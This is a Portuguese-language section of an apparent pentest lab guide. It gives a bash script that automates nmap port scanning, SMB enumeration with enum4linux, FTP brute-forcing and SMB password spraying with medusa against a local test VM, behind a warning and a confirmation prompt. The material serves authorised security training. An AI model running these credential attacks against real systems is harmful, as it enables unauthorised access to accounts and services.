
---

# 2) scripts/run_attacks.sh (cole em `scripts/run_attacks.sh`)

```bash
#!/bin/bash
# run_attacks.sh - Script de exemplo para automatizar scans básicos e ataques controlados
# ATENÇÃO: execute APENAS em ambiente autorizado (suas VMs de teste).

TARGET="192.168.56.101"      # <-- ajuste para o IP do alvo na sua rede host-only
OUTDIR="$(pwd)/outputs"
WORDDIR="$(pwd)/wordlists"
THREADS=4

mkdir -p "$OUTDIR"

echo "=== AVISO ==="
echo "Este script executará scans e ataques automatizados contra: $TARGET"
echo "Tenha certeza de que este é um ambiente de teste autorizado (VMs locais)."
read -p "Deseja continuar? [y/N] " CONF
CONF=${CONF,,}  # tolower
if [[ "$CONF" != "y" ]]; then
  echo "Abortando. Nenhuma ação foi tomada."
  exit 1
fi

echo "[*] Rodando Nmap (scan de portas comuns e serviços)..."
nmap -sS -sV -p 21,22,80,139,445 "$TARGET" -oN "$OUTDIR/nmap_quick.txt"

echo "[*] Rodando enum4linux para coleta SMB/NetBIOS..."
if command -v enum4linux >/dev/null 2>&1; then
  enum4linux -a "$TARGET" > "$OUTDIR/enum4linux.txt"
else
  echo "enum4linux não encontrado; pulando (instale com: sudo apt install enum4linux)."
fi

# FORÇA BRUTA FTP (exemplo)
if command -v medusa >/dev/null 2>&1; then
  echo "[*] Tentando brute‑force FTP com Medusa (usuário: ftpuser)"
  medusa -h "$TARGET" -M ftp -u ftpuser -P "$WORDDIR/rockyou_small.txt" -t $THREADS -f -O "$OUTDIR/medusa_ftp.txt"
else
  echo "medusa não encontrado; instale com: sudo apt install medusa"
fi

# PASSWORD SPRAY SMB (exemplo)
if command -v medusa >/dev/null 2>&1; then
  if [[ -f "$WORDDIR/users.txt" && -f "$WORDDIR/spray_passes.txt" ]]; then
    echo "[*] Tentando password-spray SMB (users.txt + spray_passes.txt)"
    medusa -h "$TARGET" -M smb -U "$WORDDIR/users.txt" -P "$WORDDIR/spray_passes.txt" -t $THREADS -f -O "$OUTDIR/medusa_smb.txt"
  else
    echo "users.txt ou spray_passes.txt não encontrados em $WORDDIR; pulando SMB."
  fi
fi

echo "[*] Script finalizado. Verifique a pasta $OUTDIR para logs."
